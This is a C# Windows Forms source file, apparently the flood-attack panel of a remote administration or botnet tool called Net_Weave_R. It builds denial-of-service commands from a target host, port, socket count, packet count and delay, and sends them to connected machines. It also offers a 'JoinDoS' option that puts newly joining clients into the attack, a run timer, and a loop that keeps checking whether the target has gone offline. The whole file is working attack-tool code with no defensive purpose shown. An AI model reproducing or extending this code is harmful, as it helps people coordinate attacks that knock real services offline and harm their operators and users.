using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using NetLib.Networking;
using Net_Weave_R.Core;
using System.Threading;
using Net_Weave_R.Misc;
using System.Net;
using Net_Weave_R.Forms.Popups;
using System.Text.RegularExpressions;
using System.Net.Sockets;

namespace Net_Weave_R.Forms
{
    public partial class FloodPanel : Form
    {
        Main main;
        public FloodPanel(Main main)
        {
            InitializeComponent();
            this.main = main;
            cmdType.SelectedIndex = 0;
            Icon = GlobalProperties.ApplicationIcon;
            Functions.Center(this);
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (xResolveHost.Checked)
            {
                try
                {
                    Regex reg = new Regex(@"\d+\.\d+\.\d+\.\d+");

                    if (!reg.IsMatch(txtHost.Text))
                    {
                        string host = txtHost.Text;

                        host = host.Replace("http://", "");
                        host = host.Replace("https://", "");
                        if (host.Contains('/'))
                        {
                            host = host.Remove(host.IndexOf('/'));
                        }
                        host = host.Replace("/", "");
                        txtHost.Text = Dns.GetHostEntry(host).AddressList[0].ToString();
                    }
                }
                catch
                {
                    if (MessageBox.Show("Unable to resolve host. Continue?", "Host Conversion Failed", MessageBoxButtons.YesNo, MessageBoxIcon.Error) != System.Windows.Forms.DialogResult.Yes)
                    {
                        return;
                    }
                }
            }
            if (xCommaFix.Checked)
                txtHost.Text = txtHost.Text.Replace(',', '.');
            try
            {
                PacketWriter w = new PacketWriter();
                w.Write((int)PacketHeader.FLOOD_START);
                w.Write(cmdType.SelectedIndex);
                w.Write(txtHost.Text);
                w.Write(int.Parse(txtPort.Text));
                w.Write(int.Parse(txtSockets.Text));
                w.Write(int.Parse(txtPackets.Text));
                w.Write(decimal.Parse(txtDelay.Text));
                byte[] b = w.ToArray(true);
                if (xJoinDoS.Checked)
                {
                    main.FloodPacket = b;
                }
                else
                    main.FloodPacket = null;
                main.Send(b);

                if (xTimer.Checked)
                {
                    FloodTimer.StartTimer(new TimeSpan(int.Parse(txtHours.Text), int.Parse(txtMins.Text), int.Parse(txtSecs.Text)));
                }

                if (xCheckHost.Checked)
                {
                    BeginCheck();
                }
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.Message, "Unable to send command", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            main.FloodPacket = null;
            PacketWriter w = new PacketWriter();
            w.Write((int)PacketHeader.FLOOD_STOP);
            byte[] b = w.ToArray(true);
            main.Send(b);

            if (xTimer.Checked)
                FloodTimer.StopTimer();

            if (t != null && t.IsAlive)
            {
                t.Abort();
                t = null;
                lblChecker.Text = "Idle...";
            }
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (t != null && t.IsAlive)
            {
                t.Abort();
                t = null;
            }
            if (Opacity != 0.0)
            {
                e.Cancel = true;
                new Thread(() =>
                {
                    while (Opacity != 0.0)
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            Opacity -= 0.1;
                        });
                        Thread.Sleep(50);
                    }
                    Invoke((MethodInvoker)delegate
                    {
                        base.OnFormClosing(e);
                        Close();
                    });
                }).Start();
            }
        }
        protected override void OnVisibleChanged(EventArgs e)
        {
            if (Visible)
            {
                Opacity = 0.0;
                new Thread(() =>
                {
                    while (Opacity != 1.0)
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            Opacity += 0.1;
                        });
                        Thread.Sleep(50);
                    }
                    Invoke((MethodInvoker)delegate
                    {
                        base.OnVisibleChanged(e);
                    });
                }).Start();
            }
        }

        private void xTopMost_CheckedChanged(object sender)
        {
            TopMost = xTopMost.Checked;
        }

        Thread t;
        void BeginCheck()
        {
            if (xCheckHost.Checked)
            {
                if (t != null)
                {
                    t.Abort();
                    t = null;
                }

                t = new Thread(() =>
                    {
                        while (true)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                lblChecker.ForeColor = Color.Black;
                                lblChecker.Text = "Checking...";
                            });
                            string host = string.Empty;
                            Socket sock = null;
                            Invoke((MethodInvoker)delegate
                            {
                                host = txtHost.Text;
                            });
                            try
                            {
                                sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                sock.BeginConnect(new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], int.Parse(txtPort.Text)), onConnect, sock);
                                Thread.Sleep(1500);
                                if (sock.Connected)
                                {
                                    Invoke((MethodInvoker)delegate
                                    {
                                        lblChecker.ForeColor = Color.Green;
                                        lblChecker.Text = "Online";
                                    });
                                }
                                else
                                {
                                    Invoke((MethodInvoker)delegate
                                    {
                                        lblChecker.ForeColor = Color.Red;
                                        lblChecker.Text = "Offline or Unknown";
                                    });
                                }
                            }
                            catch
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    try
                                    {
                                        lblChecker.ForeColor = Color.Gray;
                                        lblChecker.Text = "Unknown";
                                    }
                                    catch { }
                                });
                            }
                            if (sock.Connected)
                                sock.Close();
                            sock = null;
                            Thread.Sleep(3000);
                        }
                    });
                t.Start();
            }
        }

        void onConnect(IAsyncResult ar)
        {
            try
            {
                Socket socket = ar.AsyncState as Socket;
                socket.EndConnect(ar);
            }
            catch
            {
            }
        }

        private void xJoinDoS_CheckedChanged(object sender)
        {
            Settings.JoinDos = xJoinDoS.Checked;
        }
    }
}
